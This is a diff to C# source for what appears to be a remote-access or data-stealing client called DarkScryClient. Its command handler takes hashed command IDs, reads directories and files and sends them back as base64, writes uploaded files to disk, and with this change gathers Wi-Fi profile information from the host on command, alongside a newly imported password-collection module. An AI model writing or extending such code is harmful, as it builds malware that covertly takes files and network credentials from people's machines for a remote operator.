@@ -1,5 +1,6 @@
 ﻿using DarkScryClient.Moduls.Collection;
 using DarkScryClient.Moduls.Collection.Files;
+using DarkScryClient.Moduls.Collection.Passwords;
 using DarkScryClient.Utils;
 using System;
 using System.Collections.Generic;
@@ -19,6 +20,7 @@ namespace DarkScryClient.Client
 			public const string SNAP_FULL_DIRECTORY    = "74d6aa572d1b19102f9f5aedbe00dfd0";
 			public const string GET_FILE_BASE_64       = "d69c0ca9f6848c89b7e9223b2d186a15";
 			public const string UPLOAD_FILE_BASE_64    = "81324d42b1bbe52342d521ee64b7a30f";
+			public const string GET_WIFI_BAISIC_INFO   = "0c9f43143832f340691b2f701b5d56fa";
 		}
 
 		private XmlDocument xmlDoc;
@@ -76,6 +78,10 @@ namespace DarkScryClient.Client
 					string uploaded_file_name = xmlDoc.SelectSingleNode("/root/file_name").InnerText;
 					File.WriteAllBytes(Path.Combine(uploaded_path, uploaded_file_name), Convert.FromBase64String(uploaded_base64));
 					return Tools.StringToBytes(JsonSerializer.Serialize(new Dictionary<string, object> { { "status", true } }));
+
+				case CommandIdentifiers.GET_WIFI_BAISIC_INFO:
+					var profiles = GatherWifiInfo.GetBasicWifiInfo();
+					return Tools.StringToBytes(JsonSerializer.Serialize(profiles));
 
 				default:
 					return PackCommand("Unknow Action", action, 1);
